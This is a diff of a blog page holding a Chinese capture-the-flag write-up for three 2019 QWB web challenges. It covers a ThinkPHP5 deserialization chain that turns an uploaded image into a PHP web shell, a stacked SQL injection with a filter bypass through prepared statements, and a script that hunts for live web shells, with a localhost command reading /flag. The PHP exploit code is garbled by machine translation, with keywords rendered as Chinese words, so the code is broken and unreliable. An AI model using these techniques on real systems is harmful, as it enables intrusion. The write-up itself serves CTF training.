-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&is_video=false&description=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019强网杯web部分题解&body=Check out this article: http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&name=2019强网杯web部分题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&t=2019强网杯web部分题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
+  <main>
+    
+      
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">2019强网杯web部分题解</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="0x01上传"><a href="#0x01上传" class="headerlink" title="0x01上传"></a>0x01上传</h1><p>Docker环境：https：//github.com/CTFTraining/qwb_2019_upload<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。<br>通过dirsearch扫到网站源码。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
+<p>拿到源码首先需要查看配置文件和路由<br>，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。</p>
+<p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
+<p>查看TP5 /路由/ route.php路由功能文件，分析URL访问时控制类调用情况。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<p>Thinkphp5框架是最新版，没有找到漏洞。遂跟进网站应用控制类下。</p>
+<p>TP5 /应用/网页/控制器/ index.php的第37行<br>$profile通过cookie传入，存在任意类反序列化操作<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
+<p>搜索有可以利用的函数，发现TP5 /应用/网页/控制器/ Profile.php第43行<br>存在文件重名操作copy</p>
+<p><img src="./6.png" srcset="/img/loading.gif" alt=""><br>在profile.php下文件存在<strong>get()、</strong>call()魔术方法可以利用。<br><strong>call()通过类调用不存在方法而触发。通过可以</strong>get()向$this-&gt;{$name}传入upload_img方法，进行upload_img()方法二次调用，执行文件名重写。</p>
+<p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
+<p>在TP5 /应用/网页/控制器/ Register.php第58行，发现析构函数，检查为类变量可控。通过类轮廓调用不存在的索引（）方法即可触发轮廓类下的__call魔术方法。</p>
+<p><img src="./8.png" srcset="/img/loading.gif" alt=""><br>编写EXP</p>
+<pre><code class="hljs ruby">&lt;？php 
+namespace app \ web \ controller; 
+使用think \ Controller; 
+/<span class="hljs-regexp">/先传入带有shell的图片马，然后将生成的cookie替换当前用户字段，重新加载界面，就可以执行木马。路径可以在传入图片之后网页源码找到</span>
+<span class="hljs-regexp">.class Register &#123; </span>
+<span class="hljs-regexp">    public $ checker; </span>
+<span class="hljs-regexp">    public $ registed = false; </span>
+<span class="hljs-regexp">    public function __construct（$ checker）</span>
+<span class="hljs-regexp">    &#123; </span>
+<span class="hljs-regexp">        $ this-&gt; checker = $ checker; </span>
+<span class="hljs-regexp">    &#125; </span>
+<span class="hljs-regexp">&#125; </span>
+<span class="hljs-regexp">类档案&#123; </span>
+<span class="hljs-regexp">    公共$ filename_tmp = “./</span>上传/ <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / f3ccdd27d2000e3f9255a7e3e2c4880<span class="hljs-number">0</span>.png”; 
+    public $ filename =“./ upload / <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / shell.php”; 
+    public $ ext = <span class="hljs-literal">true</span>; 
+    public $ except = array（<span class="hljs-string">'index'</span>=&gt;<span class="hljs-string">'upload_img'</span>）; 
+&#125; 
+$ a = new Register（new Profile（））;
+印刷（用urlencode（BASE64_ENCODE（连载（$ A））））;</code></pre>
+
+<p><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="0x02随便注"><a href="#0x02随便注" class="headerlink" title="0x02随便注"></a>0x02随便注</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_supersqli<br>尝试Sql注入弹出如下过滤情况<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br>发现存在堆叠注入<br><code>1’;show tables;#</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
+<p>使用预编译语句插入查询语句<br>参考官方链接:(编写的SQL语句语法）[ <a href="https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]</a></p>
+<pre><code class="hljs less">设置<span class="hljs-variable">@sql</span> = concat（<span class="hljs-string">'sel'</span>，<span class="hljs-string">'ect * from'</span><span class="hljs-number">1919810931114514</span>`'）; 
+从<span class="hljs-variable">@sql</span>准备presql; 
+执行<span class="hljs-selector-tag">presql</span>; 
+<span class="hljs-selector-tag">deallocate</span>准备<span class="hljs-selector-tag">presql</span>;</code></pre>
+<p><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
+<p>使用strstr过滤set、prepare。大小写绕过即可<br><img src="./14.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_smarthacker</p>
+<p><img src="./15.png" srcset="/img/loading.gif" alt=""><br>拉下网页源码，发现存在shell语句但无法判断哪个是真正的Shell<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br>类似有assert、eval、system相关函数<br>编写脚本批量查shell<br><img src="./17.png" srcset="/img/loading.gif" alt=""><br><a href="http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a><br><img src="./18.png" srcset="/img/loading.gif" alt=""></p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> os,re,requests
+
+filename=os.listdir(<span class="hljs-string">'/var/www/html/src'</span>)
+pattern=re.compile(<span class="hljs-string">r"\$_[GETPOS]&#123;3,4&#125;\[.*\]"</span>)
+j=<span class="hljs-number">1</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> filename:
+    q=j+<span class="hljs-number">1</span>
+    print(i)
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'/var/www/html/src/'</span>+i,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
+        data=f.read()
+    reqname=list(set(pattern.findall(data)))
+    <span class="hljs-keyword">for</span> ret <span class="hljs-keyword">in</span> reqname:
+        <span class="hljs-keyword">try</span>:
+            command=<span class="hljs-string">'uname'</span>
+            flag=<span class="hljs-string">'Linux'</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'GET'</span> <span class="hljs-keyword">in</span> ret:
+                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]
+                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i
+                params=&#123;parm:command&#125;
+                r=requests.get(url=url,params=params)
+                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:
+                    print(<span class="hljs-string">'webshell filename is: '</span>+i)
+                    print(<span class="hljs-string">'GET_name: '</span>+parm)
+            <span class="hljs-keyword">if</span> <span class="hljs-string">'POST'</span> <span class="hljs-keyword">in</span> ret:
+                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]
+                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i
+                data=&#123;parm:command&#125;
+                r=requests.post(url=url,data=data)
+                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:
+                    print(<span class="hljs-string">'webshell filename is: '</span>+i)
+                    print(<span class="hljs-string">'POST_name: '</span>+parm)
+        <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span></code></pre>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/06/02/RIPS-2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RIPS[2] | filter_var函数缺陷</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/">
+                        <span class="hidden-mobile">2019ISCC_web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019强网杯web部分题解&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
